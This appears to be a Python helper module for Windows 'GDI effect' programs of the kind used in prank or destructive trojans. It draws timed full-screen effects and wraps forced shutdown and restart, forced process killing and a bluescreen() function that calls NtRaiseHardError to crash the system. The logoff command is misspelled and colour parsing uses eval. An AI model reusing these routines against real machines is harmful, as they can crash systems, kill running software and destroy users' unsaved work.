import ctypes
import win32gui
import win32con
import win32api
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
from time import sleep, perf_counter, time
from random import randint, choice
from enum import Enum
from os import system
from threading import Thread

def get_user32():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    return user32

def get_size(user32):
    return [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

def get_pos(user32):
    return [user32.GetSystemMetrics(76), user32.GetSystemMetrics(77)]

def get_hdc():
    return win32gui.GetDC(0)

def endless_run(func, *args, delay: int = 0.01, **kwargs):
    i = 0
    while True:
        i += 1
        func(*args, i, **kwargs)
        sleep(delay)

def kill_proccess(name: str):
    win32gui.PostMessage(win32gui.FindWindow(None, name), win32con.WM_CLOSE, 0, 0)
    return not bool(win32gui.FindWindow(None, name))

def kill_proccess2(name: str):
    system(f'taskkill /f /im {name}.exe')

def shutdown(time: int = 0):
    """shutdown system"""
    system(f'shutdown /s /f /t {time}')

def restart(time: int = 0):
    """restart system"""
    system(f'shutdown /r /f /t {time}')

def logoff():
    """log off current user"""
    system('shutdwon /l')

def color_from_str(color: str):
    color = color.strip('#')
    return eval(f'0x{color[4:6]}{color[2:4]}{color[0:2]}')

def random_color():
    def random_character():
        return choice(list('ABCDEF')) if randint(0, 1) else str(randint(0, 9))
    return color_from_str('#' + random_character() + random_character() + random_character() + random_character() + random_character() +\
        random_character())

def get_cursor_pos():
    return win32gui.GetCursorPos()

class MouseButton(Enum):
    LEFT = win32con.VK_LBUTTON
    RIGHT = win32con.VK_RBUTTON
    MIDDLE = win32con.VK_MBUTTON
    X1 = win32con.VK_XBUTTON1
    X2 = win32con.VK_XBUTTON2

def is_mouse_pressed(button: MouseButton = MouseButton.LEFT):
    return win32api.GetAsyncKeyState(button.value) & 0x8000

class __ClearWindow:
    def __init__(self, size):
        self.hInstance = win32api.GetModuleHandle()
        self.className = "GDIWipeWindow"

        wndClass = win32gui.WNDCLASS()
        wndClass.lpfnWndProc = self.wndProc
        wndClass.hInstance = self.hInstance
        wndClass.lpszClassName = self.className
        try:
            win32gui.RegisterClass(wndClass)
        except Exception:
            pass


        self.hwnd = win32gui.CreateWindowEx(win32con.WS_EX_TOPMOST | win32con.WS_EX_LAYERED | win32con.WS_EX_TOOLWINDOW, self.className, None,
            win32con.WS_POPUP, 0, 0, size[0], size[1], None, None,
            self.hInstance, None)

        win32gui.ShowWindow(self.hwnd, win32con.SW_SHOW)
        win32gui.UpdateWindow(self.hwnd)

    def wndProc(self, hwnd, msg, wParam, lParam):
        if msg == win32con.WM_DESTROY:
            win32gui.PostQuitMessage(0)
        return win32gui.DefWindowProc(hwnd, msg, wParam, lParam)

    def destroy(self):
        win32gui.DestroyWindow(self.hwnd)

def clean(size):
    wipe = __ClearWindow(size)
    sleep(0.05)
    wipe.destroy()

#from stackoverflow.com
def bluescreen():
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        POINTER(c_int)(),
        POINTER(c_int)(),
        c_uint(6),
        byref(c_uint())
    )


class GDIdata:
    def __init__(self, hdc=None, user32=None, w=None, h=None):
        self.hdc = hdc if hdc else get_hdc()
        self.user32 = user32 if user32 else get_user32()
        self.w = w if w else get_size(self.user32)[0]
        self.h = h if h else get_size(self.user32)[1]

class GDIeffect:
    def __init__(self, effect, start: int, end: int, delay: float = 0.1, data: GDIdata = GDIdata(), add_time: bool = False, **kwargs):
        self.effect = effect
        self.start = start
        self.end = end
        self.delay = delay
        self.run = False
        self.data = data
        self.add_time = add_time
        self.kwargs = kwargs

    def loop(self):
        self.run = True
        start = perf_counter()
        while self.run:
            if self.add_time: self.effect(self.data, int((perf_counter() - start) * 1000), **self.kwargs)
            else: self.effect(self.data, **self.kwargs)
            sleep(self.delay)

    def stop(self):
        self.run = False

def run_gdi(effects: list[GDIeffect]):
    start = perf_counter()
    while True:
        for eff in effects:
            if eff.start <= int((perf_counter() - start) * 1000) <= eff.end:
                if not eff.run:
                    eff.thread = Thread(target=eff.loop, daemon=True)
                    eff.thread.start()
            else:
                if eff.run:
                    eff.stop()
        sleep(0.01)